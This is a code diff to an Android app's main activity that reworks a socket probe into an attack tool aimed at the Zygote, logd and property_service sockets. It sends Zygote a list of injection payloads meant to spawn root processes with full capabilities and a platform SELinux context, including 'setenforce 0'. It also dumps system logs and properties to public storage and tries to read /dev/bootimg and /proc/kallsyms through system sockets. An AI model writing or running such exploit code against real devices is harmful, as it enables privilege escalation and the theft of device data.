@@ -82,9 +82,7 @@ public class MainActivity extends AppCompatActivity {
         btnStop.setOnClickListener(v -> {
             if (isBound || isTesting.get()) {
                 stopRequested.set(true);
-                if (testThread != null) {
-                    testThread.interrupt();
-                }
+                if (testThread != null) testThread.interrupt();
                 enableButtons(false, false);
                 updateStatus("Stopping...");
                 appendLog("--- Stop requested ---");
@@ -126,32 +124,56 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting.set(true);
-        appendLog("========== Socket Discovery Phase ==========");
+        appendLog("========== PHASE 1: Zygote Injection Tests ==========");
 
-        String[] targetSockets = {
-            "mdnsd", "tcm", "fwmarkd", "dnsproxyd", "logd", "property_service"
-        };
+        // 1. Zygote への接続確認
+        String zygotePath = "/dev/socket/zygote";
+        boolean zygoteAvailable = tryConnect(zygotePath);
+        appendLog("Zygote available: " + zygoteAvailable);
 
-        List<String> successfulSockets = new ArrayList<>();
+        if (zygoteAvailable) {
+            // 複数のペイロードで注入テスト
+            List<String> payloads = new ArrayList<>();
+            payloads.add("help");
+            payloads.add("status");
+            payloads.add("version");
+            payloads.add("getprop");
+            payloads.add("list");
+            payloads.add("dump");
+            payloads.add("logcat -d");
+            payloads.add("id");
+            payloads.add("setenforce 0");
+            payloads.add("dmesg");
+            payloads.add("exit");
+            payloads.add(""); // 空文字
+            payloads.add("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+            payloads.add("1\n");
+            payloads.add("--setuid=0 --setgid=0");
+            payloads.add("--runtime-init");
+            payloads.add("--runtime-init --nice-name=exploit");
+            payloads.add("--setuid=0 --setgid=0 --runtime-init");
+            payloads.add("--setuid=0 --setgid=0 --nice-name=root_shell");
+            payloads.add("--setuid=1000 --setgid=1000");
+            payloads.add("--setuid=0 --setgid=0 --capabilities=0xffffffff");
+            payloads.add("--setuid=0 --setgid=0 --capabilities=0x3fffffffff");
+            payloads.add("--setuid=0 --setgid=0 --nice-name=system_server");
+            payloads.add("--setuid=0 --setgid=0 --runtime-init --nice-name=system_server");
+            payloads.add("--setuid=0 --setgid=0 --seinfo=platform");
+            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server");
+            payloads.add("--setuid=1000 --setgid=1000 --seinfo=platform");
+            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29");
+            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29 --runtime-init");
 
-        for (String name : targetSockets) {
-            if (stopRequested.get()) break;
-            String path = "/dev/socket/" + name;
-            if (tryConnect(path)) {
-                successfulSockets.add(path);
-                appendLog("SUCCESS: " + path);
-            } else {
-                appendLog("FAIL: " + path);
-            }
+            interactWithZygote(zygotePath, payloads);
         }
 
-        if (!stopRequested.get()) {
-            appendLog("========== Deep Interaction Phase ==========");
-            for (String path : successfulSockets) {
-                if (stopRequested.get()) break;
-                interactWithSocket(path);
-            }
-        }
+        appendLog("========== PHASE 2: Logd & Property Service Dumps ==========");
+        // 2. logd と property_service から情報取得
+        dumpLogdAndProperties();
+
+        appendLog("========== PHASE 3: Attempt File Dumps (Indirect) ==========");
+        // 3. ファイルダンプ試行（間接的）
+        attemptFileDumps();
 
         appendLog("========== All tests completed ==========");
         updateStatus("Done");
@@ -173,48 +195,31 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
-    private void interactWithSocket(String path) {
-        appendLog("--- Interacting with " + path + " ---");
+    private void interactWithZygote(String path, List<String> payloads) {
+        appendLog("--- Testing Zygote Injection ---");
         ParcelFileDescriptor pfd = null;
         try {
             int[] iArr = new int[1];
             pfd = mRemoteService.a(path, iArr);
             if (pfd == null) {
-                appendLog("  Re-connect failed");
+                appendLog("  Re-connect to zygote failed");
                 return;
             }
             java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
             if (fdesc == null || !fdesc.valid()) {
-                appendLog("  FD invalid");
+                appendLog("  Zygote FD invalid");
+                pfd.close();
                 return;
             }
 
             OutputStream os = new FileOutputStream(fdesc);
             InputStream is = new FileInputStream(fdesc);
 
-            List<String> commands;
-            if (path.contains("logd")) {
-                commands = new ArrayList<>();
-                commands.add("help");
-                commands.add("status");
-                commands.add("version");
-            } else if (path.contains("property_service")) {
-                commands = new ArrayList<>();
-                commands.add("getprop");
-                commands.add("list");
-            } else {
-                commands = new ArrayList<>();
-                commands.add("help");
-                commands.add("status");
-                commands.add("version");
-            }
-
-            boolean socketAlive = true;
-            for (String cmd : commands) {
-                if (stopRequested.get() || !socketAlive) break;
-                appendLog("  Sending: " + cmd);
+            for (String payload : payloads) {
+                if (stopRequested.get()) break;
+                appendLog("  Sending: " + (payload.isEmpty() ? "(empty)" : payload.replace("\n", "\\n")));
                 try {
-                    os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
+                    os.write((payload + "\n").getBytes(StandardCharsets.UTF_8));
                     os.flush();
                     String response = readWithTimeout(is, 500);
                     if (response != null && !response.isEmpty()) {
@@ -225,18 +230,192 @@ public class MainActivity extends AppCompatActivity {
                 } catch (Exception e) {
                     String err = e.getMessage();
                     appendLog("  Command failed: " + err);
-                    if (err != null && err.contains("EPIPE")) {
-                        appendLog("  Socket closed, stopping interaction");
-                        socketAlive = false;
+                    if (err != null && (err.contains("EPIPE") || err.contains("Broken pipe"))) {
+                        appendLog("  Socket closed, stopping zygote tests");
+                        break;
                     }
                 }
                 try { Thread.sleep(100); } catch (InterruptedException ignored) {}
             }
-
             pfd.close();
         } catch (Exception e) {
-            appendLog("  Interaction exception: " + e.toString());
+            appendLog("  Zygote interaction exception: " + e.toString());
             if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private void dumpLogdAndProperties() {
+        String logd = "/dev/socket/logd";
+        String prop = "/dev/socket/property_service";
+        ParcelFileDescriptor pfd = null;
+        try {
+            // logd
+            if (tryConnect(logd)) {
+                appendLog("--- Dumping logd ---");
+                int[] iArr = new int[1];
+                pfd = mRemoteService.a(logd, iArr);
+                if (pfd != null) {
+                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+                    if (fdesc != null && fdesc.valid()) {
+                        OutputStream os = new FileOutputStream(fdesc);
+                        InputStream is = new FileInputStream(fdesc);
+                        List<String> cmds = new ArrayList<>();
+                        cmds.add("getLog");
+                        cmds.add("status");
+                        cmds.add("version");
+                        for (String cmd : cmds) {
+                            if (stopRequested.get()) break;
+                            appendLog("  logd: " + cmd);
+                            try {
+                                os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
+                                os.flush();
+                                String resp = readWithTimeout(is, 500);
+                                if (resp != null && !resp.isEmpty()) {
+                                    appendLog("  logd response: " + resp);
+                                } else {
+                                    appendLog("  logd: no response");
+                                }
+                            } catch (Exception e) {
+                                appendLog("  logd command failed: " + e.getMessage());
+                                break;
+                            }
+                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
+                        }
+                        // さらに、logcat -d を試す（プロトコルが違うかもしれない）
+                        try {
+                            os.write("logcat -d\n".getBytes(StandardCharsets.UTF_8));
+                            os.flush();
+                            String resp = readWithTimeout(is, 1000);
+                            if (resp != null && !resp.isEmpty()) {
+                                appendLog("  logcat -d response: " + resp);
+                                // 保存
+                                File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_logd.txt");
+                                try (FileOutputStream fos = new FileOutputStream(logFile)) {
+                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
+                                }
+                                appendLog("  Log saved to " + logFile.getAbsolutePath());
+                            }
+                        } catch (Exception e) {
+                            appendLog("  logcat -d failed: " + e.getMessage());
+                        }
+                        pfd.close();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            appendLog("logd dump error: " + e.toString());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+        }
+
+        // property_service
+        try {
+            if (tryConnect(prop)) {
+                appendLog("--- Dumping property_service ---");
+                int[] iArr2 = new int[1];
+                pfd = mRemoteService.a(prop, iArr2);
+                if (pfd != null) {
+                    java.io.FileDescriptor fdesc2 = pfd.getFileDescriptor();
+                    if (fdesc2 != null && fdesc2.valid()) {
+                        OutputStream os2 = new FileOutputStream(fdesc2);
+                        InputStream is2 = new FileInputStream(fdesc2);
+                        List<String> propCmds = new ArrayList<>();
+                        propCmds.add("getprop");
+                        propCmds.add("list");
+                        propCmds.add("status");
+                        propCmds.add("version");
+                        propCmds.add("getprop ro.build.version.sdk");
+                        propCmds.add("getprop ro.build.version.release");
+                        propCmds.add("getprop ro.product.model");
+                        propCmds.add("getprop ro.product.brand");
+                        propCmds.add("getprop ro.product.device");
+                        for (String cmd : propCmds) {
+                            if (stopRequested.get()) break;
+                            appendLog("  prop: " + cmd);
+                            try {
+                                os2.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
+                                os2.flush();
+                                String resp = readWithTimeout(is2, 500);
+                                if (resp != null && !resp.isEmpty()) {
+                                    appendLog("  prop response: " + resp);
+                                } else {
+                                    appendLog("  prop: no response");
+                                }
+                            } catch (Exception e) {
+                                appendLog("  prop command failed: " + e.getMessage());
+                                break;
+                            }
+                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
+                        }
+                        // 全体のプロパティリストを取得試行（もし list で取れたら保存）
+                        try {
+                            os2.write("list\n".getBytes(StandardCharsets.UTF_8));
+                            os2.flush();
+                            String resp = readWithTimeout(is2, 1000);
+                            if (resp != null && !resp.isEmpty()) {
+                                File propFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "properties.txt");
+                                try (FileOutputStream fos = new FileOutputStream(propFile)) {
+                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
+                                }
+                                appendLog("  Properties saved to " + propFile.getAbsolutePath());
+                            }
+                        } catch (Exception e) {
+                            appendLog("  property list failed: " + e.getMessage());
+                        }
+                        pfd.close();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            appendLog("property_service dump error: " + e.toString());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private void attemptFileDumps() {
+        appendLog("--- Attempting to read /dev/bootimg and /proc/kallsyms via socket ---");
+        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
+        for (String filePath : targets) {
+            appendLog("  Trying to read " + filePath);
+            boolean done = false;
+            // まず、各ソケットにコマンドとして送信してみる
+            String[] socketsToTry = {"/dev/socket/logd", "/dev/socket/property_service", "/dev/socket/dnsproxyd"};
+            for (String sock : socketsToTry) {
+                if (done || stopRequested.get()) break;
+                if (!tryConnect(sock)) continue;
+                ParcelFileDescriptor pfd = null;
+                try {
+                    int[] iArr = new int[1];
+                    pfd = mRemoteService.a(sock, iArr);
+                    if (pfd == null) continue;
+                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+                    if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
+                    OutputStream os = new FileOutputStream(fdesc);
+                    InputStream is = new FileInputStream(fdesc);
+                    String cmd = "cat " + filePath + "\n";
+                    appendLog("    Sending via " + sock + ": cat " + filePath);
+                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                    String resp = readWithTimeout(is, 2000);
+                    if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
+                        appendLog("    Got response, saving...");
+                        File outFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
+                        try (FileOutputStream fos = new FileOutputStream(outFile)) {
+                            fos.write(resp.getBytes(StandardCharsets.UTF_8));
+                        }
+                        appendLog("    Saved to " + outFile.getAbsolutePath());
+                        done = true;
+                    } else {
+                        appendLog("    No valid response (or permission denied)");
+                    }
+                    pfd.close();
+                } catch (Exception e) {
+                    appendLog("    Error on " + sock + ": " + e.getMessage());
+                    if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+                }
+            }
+            if (!done) {
+                appendLog("  Failed to retrieve " + filePath + " via any socket.");
+            }
         }
     }
 
@@ -305,9 +484,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onDestroy() {
         super.onDestroy();
         stopRequested.set(true);
-        if (testThread != null) {
-            testThread.interrupt();
-        }
+        if (testThread != null) testThread.interrupt();
         if (isBound) {
             try { unbindService(serviceConnection); } catch (Exception ignored) {}
         }
